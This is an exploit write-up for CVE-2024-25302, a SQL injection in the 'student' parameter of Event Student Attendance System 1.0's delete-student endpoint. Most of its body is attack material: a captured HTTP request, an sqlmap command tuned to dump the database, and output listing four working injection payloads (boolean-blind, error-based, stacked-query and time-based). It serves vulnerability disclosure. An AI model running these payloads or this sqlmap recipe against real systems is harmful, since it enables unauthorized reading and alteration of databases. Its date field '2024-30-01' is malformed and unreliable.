# CVE-2024-25302 - Event Student Attendance System - SQL Injection
+ *Exploit Title:* Event Student Attendance System - SQL Injection
+ *Date:* 2024-30-01
+ *Exploit Author:* Tuba Kavgacı
+ *Vendor Homepage:* https://www.sourcecodester.com/php/17139/event-student-attendance-system-using-php-and-mysql-source-code.html
+ *Software Link:* https://www.sourcecodester.com/download-code?nid=17139&title=Event+Student+Attendance+System+Using+PHP+and+MySQL+with+Source+Code
+ *Version:* 1.0
+ *Tested on:* Windows 11 Home + PHP 8.2.12, Apache 2.4.58
+ *CVE:* CVE-2024-25302

## References: 
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25302
+ https://nvd.nist.gov/vuln/detail/CVE-2024-25302
+ https://vuldb.com/?id.253307
+ https://portswigger.net/web-security/sql-injection

## Description:
Event Student Attendance System 1.0, allows SQL Injection via the 'student' parameter in `http://localhost/event-student-attendance/endpoint/delete-student.php?student=3`. Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/event-student-attendance"
+ Select any student and press the delete-student button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /event-student-attendance/endpoint/delete-student.php?student=3 HTTP/1.1
Host: localhost
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'student' parameter to dump the database.
```
python sqlmap.py -r r.txt -p student --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: student (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: student=3' RLIKE (SELECT (CASE WHEN (6164=6164) THEN 3 ELSE 0x28 END))-- gVVq

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: student=3' AND EXTRACTVALUE(1609,CONCAT(0x5c,0x71787a6271,(SELECT (ELT(1609=1609,1))),0x7176787871))-- qYlQ

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: student=3';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: student=3' AND (SELECT 8964 FROM (SELECT(SLEEP(5)))RifB)-- PFRp
---
[16:48:22] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[16:48:22] [INFO] fetching current database
[16:48:22] [INFO] retrieved: 'event_attendance_db'
current database: 'event_attendance_db'
```
+ current database : `event_attendance_db`
  
  ![Ekran görüntüsü 2024-01-30 165509](https://github.com/tubakvgc/CVE/assets/74067343/bd372ec7-a7f3-4200-b030-ece2d90ab0f5)


  
